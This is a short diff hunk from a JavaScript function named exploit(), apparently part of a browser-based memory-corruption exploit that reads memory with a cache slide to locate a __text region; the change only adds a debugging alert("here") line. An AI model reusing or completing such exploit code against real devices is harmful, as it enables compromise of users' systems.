@@ -736,7 +736,7 @@ function exploit(){
 
                                 var addr = Add(memory.readInt64(Add(base, o + 0x20)), cache_slide)
                                 var size = memory.u32(Add(base, o + 0x28))
-
+                                alert("here")
                                 // Copy the entire __text region into a Uint32Array for faster processing.
                                 // Previously you could map a Uint32Array over the data, but on i7+ devices
                                 // this caused access violations.
